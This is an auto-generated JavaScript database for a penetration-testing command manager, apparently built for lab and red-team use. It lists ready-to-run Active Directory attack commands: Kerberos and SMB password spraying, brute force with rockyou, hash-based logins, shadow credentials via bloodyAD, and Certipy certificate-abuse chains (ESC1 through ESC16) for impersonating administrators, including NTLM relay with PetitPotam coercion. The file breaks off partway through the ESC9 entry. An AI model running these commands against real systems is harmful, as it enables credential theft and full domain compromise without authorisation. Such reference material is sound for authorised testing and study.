// Command Manager - Command Database
// AUTO-GENERATED — do not edit manually.
// To add or modify commands, edit the JSON files in the commands/ directory.
// Then run: node build-commands.js

const COMMAND_DATA = {
  "categories": {
    "enumeration": {
      "name": "🔍 Enumeration",
      "subcategories": {
        "network": "Network Discovery",
        "smb": "SMB",
        "ldap": "LDAP",
        "kerberos": "Kerberos",
        "dns": "DNS",
        "winrm": "WinRM",
        "mssql": "MSSQL",
        "ssh": "SSH",
        "ftp": "FTP",
        "nfs": "NFS",
        "bloodhound-queries": "BloodHound Cypher Queries"
      }
    },
    "authentication": {
      "name": "🔑 Authentication",
      "subcategories": {
        "credential-testing": "Credential Testing",
        "brute-force": "Brute Force & Spraying"
      }
    },
    "credential-attacks": {
      "name": "🔓 Credential Attacks",
      "subcategories": {
        "hash-dumping": "Hash Dumping",
        "hash-cracking": "Hash Cracking",
        "kerberoasting": "Kerberoasting",
        "asreproasting": "AS-REP Roasting",
        "ntlm-relay": "NTLM Relay & Coercion",
        "adcs": "ADCS (Certificate Abuse)",
        "ticket-attacks": "Ticket Forgery & Conversion",
        "password-manipulation": "Password Manipulation",
        "gmsa-laps": "gMSA & LAPS"
      }
    },
    "privilege-escalation": {
      "name": "⬆️ Privilege Escalation",
      "subcategories": {
        "acl-abuse": "ACL / DACL Abuse",
        "delegation": "Delegation Abuse",
        "gpo-abuse": "GPO Abuse",
        "local-privesc": "Local PrivEsc",
        "trust-attacks": "Trust Attacks"
      }
    },
    "lateral-movement": {
      "name": "↔️ Lateral Movement",
      "subcategories": {
        "remote-shells": "Remote Shells",
        "pass-the-hash": "Pass-the-Hash / Ticket",
        "mssql": "MSSQL",
        "rdp-ssh": "RDP / SSH"
      }
    },
    "post-exploitation": {
      "name": "📦 Post-Exploitation",
      "subcategories": {
        "ad-object-manipulation": "AD Object Manipulation",
        "file-search": "File Search",
        "data-collection": "Data Collection",
        "persistence": "Persistence"
      }
    },
    "utilities": {
      "name": "🛠️ Utilities",
      "subcategories": {
        "file-transfer": "File Transfer",
        "network-setup": "Network & Time Setup",
        "shell-helpers": "Shell Helpers"
      }
    }
  },
  "commands": [
    {
      "id": "kerbrute-spray",
      "name": "Kerbrute Password Spray",
      "command": "kerbrute passwordspray -d '<domain>' --dc '<ip>' '<userlist>' '<password>'",
      "category": "authentication",
      "subcategory": "brute-force",
      "description": "Password spray a single password against a list of users via Kerberos (avoids lockout, no failed logon events)",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "kerbrute",
        "password-spray",
        "kerberos",
        "brute-force",
        "domain-users"
      ],
      "examples": [
        "kerbrute passwordspray -d 'CORP.LOCAL' --dc '192.168.1.100' users.txt 'Password123'"
      ]
    },
    {
      "id": "nxc-smb-bruteforce",
      "name": "NetExec SMB Brute Force",
      "command": "nxc smb <ip> -u <user> -p <wordlist> --ignore-pw-decoding",
      "category": "authentication",
      "subcategory": "brute-force",
      "description": "SMB password brute force attack",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "brute-force",
        "password"
      ],
      "examples": [
        "nxc smb 192.168.1.100 -u administrator -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding"
      ]
    },
    {
      "id": "nxc-smb-spray",
      "name": "NetExec SMB Password Spray",
      "command": "nxc smb '<ip>' -u '<userlist>' -p '<password>' --continue-on-success",
      "category": "authentication",
      "subcategory": "brute-force",
      "description": "Spray a single password against multiple users via SMB, continuing on valid hits",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "password-spray",
        "brute-force",
        "credential-testing"
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u users.txt -p 'Password123' --continue-on-success"
      ]
    },
    {
      "id": "nxc-ftp-auth",
      "name": "NetExec FTP Auth & Listing",
      "command": "nxc ftp <ip> -u <user> -p <password>",
      "category": "authentication",
      "subcategory": "credential-testing",
      "description": "Validate FTP credentials and check anonymous access. Combine with --ls to list the root directory after a successful login.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ftp"
      ],
      "tags": [
        "nxc",
        "netexec",
        "ftp",
        "auth",
        "anonymous"
      ],
      "variations": [
        {
          "label": "Anonymous Check",
          "requires": "no-creds",
          "command": "nxc ftp <ip> -u 'anonymous' -p ''"
        },
        {
          "label": "List Root After Login",
          "requires": "password",
          "command": "nxc ftp <ip> -u <user> -p <password> --ls /"
        }
      ],
      "references": [
        {
          "title": "NetExec — FTP Protocol",
          "url": "https://www.netexec.wiki/ftp-protocol"
        }
      ],
      "examples": [
        "nxc ftp 10.10.10.10 -u 'anonymous' -p ''",
        "nxc ftp 10.10.10.0/24 -u <users.txt> -p <passwords.txt> --continue-on-success"
      ]
    },
    {
      "id": "nxc-rdp-auth",
      "name": "NetExec RDP Auth Check",
      "command": "nxc rdp <ip> -u <user> -p <password>",
      "category": "authentication",
      "subcategory": "credential-testing",
      "description": "Validate credentials against the RDP service (TCP/3389) without opening a graphical session. Useful for spraying and quick triage.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rdp"
      ],
      "tags": [
        "nxc",
        "netexec",
        "rdp",
        "auth",
        "credential-validation",
        "spray"
      ],
      "variations": [
        {
          "label": "NTLM Hash (Restricted Admin)",
          "requires": "hash",
          "command": "nxc rdp <ip> -u <user> -H <hash>"
        },
        {
          "label": "Spray Across Subnet",
          "requires": "password",
          "command": "nxc rdp <subnet> -u <user> -p <password> --continue-on-success"
        }
      ],
      "references": [
        {
          "title": "NetExec — RDP Protocol",
          "url": "https://www.netexec.wiki/rdp-protocol"
        }
      ],
      "examples": [
        "nxc rdp 10.10.10.10 -u administrator -p 'Password123!'",
        "nxc rdp 10.10.10.0/24 -u admin -H :e19ccf75ee54e06b06a5907af13cef42 --continue-on-success"
      ]
    },
    {
      "id": "nxc-smb-auth",
      "name": "NetExec SMB Auth Test",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -d '<domain>'",
      "category": "authentication",
      "subcategory": "credential-testing",
      "description": "Test SMB authentication with various credential types",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "authentication",
        "credential-testing"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -d '<domain>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' --use-kcache -d '<domain>'"
        },
        {
          "label": "Local Auth",
          "requires": "password",
          "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --local-auth"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -p 'password123' -d 'domain.local'",
        "nxc smb '10.10.11.76' -u 'admin' -H 'aad3b435b51404ee:e19ccf75ee54e06b' -d 'domain.local'",
        "nxc smb '10.10.11.76' --use-kcache -d 'voleur.htb' --shares"
      ]
    },
    {
      "id": "nxc-smb-kerberos",
      "name": "NetExec SMB with Kerberos Auth",
      "command": "KRB5CCNAME=<ccache> nxc smb <hostname> -u <user> -k --use-kcache",
      "category": "authentication",
      "subcategory": "credential-testing",
      "description": "Authenticate to SMB using a Kerberos ticket from a ccache file instead of NTLM. Required when NTLM is disabled or when impersonating via S4U / silver tickets. The target must be addressed by hostname (FQDN), not IP, and DNS must resolve correctly.",
      "platform": "linux",
      "requires": [
        "ticket"
      ],
      "protocols": [
        "smb",
        "kerberos"
      ],
      "tags": [
        "nxc",
        "netexec",
        "smb",
        "kerberos",
        "ccache",
        "pass-the-ticket"
      ],
      "variations": [
        {
          "label": "AES Key",
          "requires": "aes-key",
          "command": "nxc smb <hostname> -u <user> -d <domain> --aesKey <aes_key> -k"
        },
        {
          "label": "With Shares Enum",
          "requires": "ticket",
          "command": "KRB5CCNAME=<ccache> nxc smb <hostname> -u <user> -k --use-kcache --shares"
        }
      ],
      "references": [
        {
          "title": "NetExec — Kerberos Authentication",
          "url": "https://www.netexec.wiki/getting-started/kerberos-authentication"
        }
      ],
      "examples": [
        "KRB5CCNAME=administrator.ccache nxc smb dc01.corp.local -u administrator -k --use-kcache --shares",
        "nxc smb dc01.corp.local -u administrator -d corp.local --aesKey 5f8a... -k"
      ]
    },
    {
      "id": "nxc-ssh-auth",
      "name": "NetExec SSH Auth & Spray",
      "command": "nxc ssh <ip> -u <user> -p <password>",
      "category": "authentication",
      "subcategory": "credential-testing",
      "description": "Validate credentials against SSH. Supports password, key file, and spraying across user/password lists. NetExec also detects when the resulting session is root.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ssh"
      ],
      "tags": [
        "nxc",
        "netexec",
        "ssh",
        "auth",
        "spray"
      ],
      "variations": [
        {
          "label": "Private Key",
          "requires": "no-creds",
          "command": "nxc ssh <ip> -u <user> --key-file <id_rsa>"
        },
        {
          "label": "Spray With User+Password Lists",
          "requires": "no-creds",
          "command": "nxc ssh <subnet> -u <users.txt> -p <passwords.txt> --continue-on-success"
        },
        {
          "label": "Run a Command",
          "requires": "password",
          "command": "nxc ssh <ip> -u <user> -p <password> -x '<command>'"
        }
      ],
      "references": [
        {
          "title": "NetExec — SSH Protocol",
          "url": "https://www.netexec.wiki/ssh-protocol"
        }
      ],
      "examples": [
        "nxc ssh 10.10.10.10 -u root -p 'toor'",
        "nxc ssh 10.10.10.10 -u ubuntu --key-file ~/.ssh/id_rsa -x 'sudo -l'"
      ]
    },
    {
      "id": "nxc-winrm-auth",
      "name": "NetExec WinRM Auth Check",
      "command": "nxc winrm <ip> -u <user> -p <password>",
      "category": "authentication",
      "subcategory": "credential-testing",
      "description": "Validate credentials against the WinRM (PowerShell Remoting) service. A successful login with the (Pwn3d!) marker means you can execute commands.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "winrm"
      ],
      "tags": [
        "nxc",
        "netexec",
        "winrm",
        "auth",
        "credential-validation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc winrm <ip> -u <user> -H <hash>"
        },
        {
          "label": "Kerberos (ccache)",
          "requires": "ticket",
          "command": "KRB5CCNAME=<ccache> nxc winrm <ip> -u <user> -k --use-kcache"
        },
        {
          "label": "Local Auth",
          "requires": "password",
          "command": "nxc winrm <ip> -u <user> -p <password> --local-auth"
        }
      ],
      "references": [
        {
          "title": "NetExec — WinRM Protocol",
          "url": "https://www.netexec.wiki/winrm-protocol"
        }
      ],
      "examples": [
        "nxc winrm 10.10.10.10 -u administrator -p 'Password123!'",
        "nxc winrm 10.10.10.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42"
      ]
    },
    {
      "id": "bloodyad-shadow-credentials",
      "name": "bloodyAD Shadow Credentials",
      "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add shadowCredentials <target>",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Add a Key Credential (msDS-KeyCredentialLink) to a target object you have GenericWrite over. After this you can request a TGT for the target via PKINIT (Certipy auth -pfx) and pivot through the account. Cleaner replacement for Whisker.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "shadow-credentials",
        "kcd",
        "pkinit",
        "msds-keycredentiallink",
        "acl-abuse"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p :<hash> add shadowCredentials <target>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "KRB5CCNAME=<ccache> bloodyAD --host <dc-fqdn> -d <domain> -u <user> -k add shadowCredentials <target>"
        },
        {
          "label": "Cleanup",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> remove shadowCredentials <target>"
        }
      ],
      "references": [
        {
          "title": "bloodyAD docs",
          "url": "https://github.com/CravateRouge/bloodyAD/wiki"
        },
        {
          "title": "The Hacker Recipes — Shadow Credentials",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add shadowCredentials 'DC01$'",
        "certipy auth -pfx <generated.pfx> -dc-ip 10.10.10.10"
      ]
    },
    {
      "id": "certipy-account",
      "name": "Certipy Account Operations",
      "command": "certipy account create -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <new_account> -pass <new_password>",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Create, update, read, or delete user / computer accounts directly through Certipy. Particularly useful for ESC9/ESC10 chains where you need to update an account's UPN or sAMAccountName mid-attack.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc9",
        "esc10",
        "account",
        "upn"
      ],
      "variations": [
        {
          "label": "Update UPN (ESC9/10)",
          "requires": "password",
          "command": "certipy account update -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <target> -upn '<new_upn>'"
        },
        {
          "label": "Read Account",
          "requires": "password",
          "command": "certipy account read -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <target>"
        },
        {
          "label": "Delete Account",
          "requires": "password",
          "command": "certipy account delete -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <target>"
        }
      ],
      "references": [
        {
          "title": "Certipy README",
          "url": "https://github.com/ly4k/Certipy"
        },
        {
          "title": "ESC9 / ESC10 Writeup",
          "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
        }
      ],
      "examples": [
        "certipy account update -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -user victim -upn 'administrator@corp.local'",
        "certipy account read -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -user victim"
      ]
    },
    {
      "id": "certipy-auth",
      "name": "Certipy Authenticate with Certificate",
      "command": "certipy auth -pfx '<pfx_file>' -dc-ip <ip>",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Authenticate using a PFX certificate to obtain a TGT and NT hash",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "certipy",
        "adcs",
        "certificate",
        "authentication",
        "pfx",
        "pkinit"
      ],
      "examples": [
        "certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.100"
      ]
    },
    {
      "id": "certipy-ca",
      "name": "Certipy CA Management",
      "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -list-officers",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Enumerate and manipulate the certificate authority itself: list officers (ESC7), backup the CA private key, add/remove officers and managers, list templates available on the CA. Required for ESC7 escalation chains.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "rpc"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc7",
        "ca",
        "officer",
        "backup"
      ],
      "variations": [
        {
          "label": "Backup CA Key",
          "requires": "password",
          "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -backup"
        },
        {
          "label": "Add Officer (ESC7)",
          "requires": "password",
          "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -add-officer <new_officer>"
        },
        {
          "label": "List Templates",
          "requires": "password",
          "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -list-templates"
        },
        {
          "label": "Enable Template",
          "requires": "password",
          "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -enable-template '<template>'"
        }
      ],
      "references": [
        {
          "title": "Certipy README",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "examples": [
        "certipy ca -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -list-officers",
        "certipy ca -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -enable-template 'SmartcardLogon'"
      ]
    },
    {
      "id": "certipy-esc1",
      "name": "Certipy ESC1 (Subject in Request)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -template '<vulnerable_template>' -upn '<target_user>@<domain>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Exploit ESC1: a template that allows the requester to specify a Subject Alternative Name (ENROLLEE_SUPPLIES_SUBJECT) lets you request a certificate with someone else's UPN. The resulting cert authenticates as that user.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "rpc"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc1",
        "upn",
        "san",
        "impersonation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "certipy req -u '<user>@<domain>' -hashes ':<hash>' -dc-ip <dc-ip> -ca '<ca_name>' -template '<template>' -upn '<target>@<domain>'"
        },
        {
          "label": "Then Authenticate",
          "requires": "no-creds",
          "command": "certipy auth -pfx <target>.pfx -dc-ip <dc-ip>"
        },
        {
          "label": "DNS-based (computer SAN)",
          "requires": "password",
          "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -template '<template>' -dns '<dc-fqdn>'"
        }
      ],
      "references": [
        {
          "title": "Certipy README",
          "url": "https://github.com/ly4k/Certipy"
        },
        {
          "title": "SpecterOps — ADCS Attacks",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        }
      ],
      "examples": [
        "certipy req -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'VulnUserCert' -upn 'administrator@corp.local'",
        "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10"
      ]
    },
    {
      "id": "certipy-esc11",
      "name": "Certipy ESC11 (RPC Relay to ICPR)",
      "command": "certipy relay -target 'rpc://<ca-host>' -template '<template>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC11: ICertPassage RPC interface accepts NTLM without IF_ENFORCEENCRYPTICERTREQUEST. Relay coerced authentication to the CA's RPC endpoint and enroll certificates as the relayed identity.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "rpc"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc11",
        "relay",
        "icpr"
      ],
      "references": [
        {
          "title": "ESC11 writeup",
          "url": "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/"
        }
      ],
      "examples": [
        "certipy relay -target 'rpc://ca.corp.local' -template DomainController"
      ]
    },
    {
      "id": "certipy-esc13",
      "name": "Certipy ESC13 (OID Group Link)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<template>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC13: a template's issuance policy is linked to a privileged group via msDS-OIDToGroupLink. Enrolling adds the linked group SID to the resulting Kerberos ticket — instant group membership without ever touching the group object.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc13",
        "oid",
        "group-link"
      ],
      "references": [
        {
          "title": "ESC13 writeup",
          "url": "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
        }
      ],
      "examples": [
        "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template ESC13Template",
        "certipy auth -pfx jdoe.pfx -domain corp.local"
      ]
    },
    {
      "id": "certipy-esc14",
      "name": "Certipy ESC14 (altSecurityIdentities Mapping)",
      "command": "certipy account update -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user '<victim>' -upn '<target>@<domain>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC14: weak explicit certificate mapping via altSecurityIdentities. With write access over a victim object, set an explicit mapping that lets a certificate you control authenticate as the victim. Combine with `account update` to write the attribute, then `auth -pfx` with your existing cert.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc14",
        "altsecurityidentities",
        "explicit-mapping"
      ],
      "references": [
        {
          "title": "Certipy v5 release notes",
          "url": "https://github.com/ly4k/Certipy/releases"
        },
        {
          "title": "ESC14 writeup",
          "url": "https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9"
        }
      ],
      "examples": [
        "certipy account update -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -user victim -upn administrator@corp.local",
        "certipy auth -pfx jdoe.pfx -domain corp.local"
      ]
    },
    {
      "id": "certipy-esc15",
      "name": "Certipy ESC15 (Schema V1 EKUwu)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<v1-template>' -application-policies 'Client Authentication' -upn '<target>@<domain>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC15 / EKUwu: schema v1 templates honor Application Policies from the CSR, letting an enrollee inject Client Authentication EKU into a template that does not normally allow it. Combine with a SAN/UPN override to impersonate any user.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc15",
        "ekuwu",
        "application-policies"
      ],
      "references": [
        {
          "title": "EKUwu (CVE-2024-49019)",
          "url": "https://www.trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc"
        }
      ],
      "examples": [
        "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template WebServer -application-policies 'Client Authentication' -upn administrator@corp.local"
      ]
    },
    {
      "id": "certipy-esc16",
      "name": "Certipy ESC16 (CA Security Extension Disabled)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template User -upn '<target>@<domain>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC16: the CA has the szOID_NTDS_CA_SECURITY_EXT object identifier in DisableExtensionList, so issued certificates omit the strong SID security extension entirely. Any template that lets you specify a SAN/UPN now permits impersonation regardless of strong-mapping enforcement. Detect with `certipy find -vulnerable`.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc16",
        "security-extension",
        "strong-mapping"
      ],
      "references": [
        {
          "title": "Certipy v5 release notes",
          "url": "https://github.com/ly4k/Certipy/releases"
        },
        {
          "title": "Strong cert mapping (KB5014754)",
          "url": "https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16"
        }
      ],
      "examples": [
        "certipy find -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -vulnerable -enabled",
        "certipy req -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -ca CORP-CA -template User -upn administrator@corp.local"
      ]
    },
    {
      "id": "certipy-esc2",
      "name": "Certipy ESC2 (Any Purpose EKU)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<template>' -upn '<target>@<domain>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC2: template has the Any Purpose EKU (or no EKU at all), so the issued cert can be used for any purpose including client authentication. Request as your user but specify a privileged UPN to impersonate.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc2",
        "any-purpose-eku"
      ],
      "references": [
        {
          "title": "Certipy ESC2",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "examples": [
        "certipy req -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -ca CORP-CA -template AnyPurpose -upn administrator@corp.local"
      ]
    },
    {
      "id": "certipy-esc3",
      "name": "Certipy ESC3 (Enrollment Agent)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<enrollment-agent-template>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC3: a template has the Certificate Request Agent EKU. Get an enrollment-agent cert, then use it to enroll on behalf of any user — typically a Domain Admin — against a template that allows enroll-on-behalf-of.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc3",
        "enrollment-agent"
      ],
      "examples": [
        "# Step 1: get enrollment agent cert",
        "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template EnrollmentAgent",
        "# Step 2: use it to request a cert as administrator",
        "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template User -on-behalf-of 'CORP\\administrator' -pfx jdoe.pfx"
      ],
      "references": [
        {
          "title": "Certipy ESC3",
          "url": "https://github.com/ly4k/Certipy"
        }
      ]
    },
    {
      "id": "certipy-esc6",
      "name": "Certipy ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template User -upn '<target>@<domain>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC6: the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, allowing any enrollee to specify an arbitrary SAN on any template — instant impersonation against the User template.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc6",
        "san",
        "ca-misconfig"
      ],
      "references": [
        {
          "title": "Certipy ESC6",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "examples": [
        "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template User -upn administrator@corp.local"
      ]
    },
    {
      "id": "certipy-esc7",
      "name": "Certipy ESC7 (Vulnerable CA Access Rights)",
      "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -add-officer '<user>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC7: you have ManageCA or ManageCertificates on the CA. Add yourself as an officer, approve a previously failed request, or issue a new cert. Also lets you flip CA flags such as EDITF_ATTRIBUTESUBJECTALTNAME2 to enable ESC6.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rpc",
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc7",
        "manage-ca"
      ],
      "variations": [
        {
          "label": "Issue Failed Request",
          "requires": "password",
          "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -issue-request <request-id>"
        },
        {
          "label": "List Templates",
          "requires": "password",
          "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -list-templates"
        }
      ],
      "references": [
        {
          "title": "Certipy ESC7",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "examples": [
        "certipy ca -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -add-officer jdoe"
      ]
    },
    {
      "id": "certipy-esc8",
      "name": "Certipy ESC8 (HTTP Web Enrollment Relay)",
      "command": "certipy relay -target 'http://<ca-fqdn>' -template '<template>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC8: AD CS Web Enrollment endpoint accepts NTLM and is missing EPA. Relay coerced machine authentication (PetitPotam, DFSCoerce, PrinterBug) to /certsrv to enroll a cert as the victim — typically a DC machine account, yielding a TGT-capable certificate.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "http",
        "ntlm"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc8",
        "relay",
        "ntlm-relay",
        "web-enrollment"
      ],
      "variations": [
        {
          "label": "Default DomainController template",
          "requires": "no-creds",
          "command": "certipy relay -target 'http://<ca-fqdn>' -template DomainController"
        }
      ],
      "references": [
        {
          "title": "Certipy ESC8",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "examples": [
        "certipy relay -target 'http://ca.corp.local' -template DomainController",
        "# In another terminal: coerce auth from DC to your relay host",
        "python3 PetitPotam.py <attacker-ip> <dc-ip>"
      ]
    },
    {
      "id": "certipy-esc9",
      "name": "Certipy ESC9 (No Security Extension)",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<template>' -upn '<target>@<domain>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC9: certificate template has CT_FLAG_NO_SECURITY_EXTENSION, so the new szOID_NTDS_CA_SECURITY_EXT is not embedded. Combined with GenericWrite over a victim user, change their UPN to a target (e.g. administrator), enroll, then revert UPN and authenticate with the cert.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc9",
        "upn",
        "genericwrite"
      ],
      "references": [
        {
          "title": "ADCS ESC9 / ESC10",
          "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
        }
      ],
      "examples": [
        "# 1. Set victim UPN to administrator",
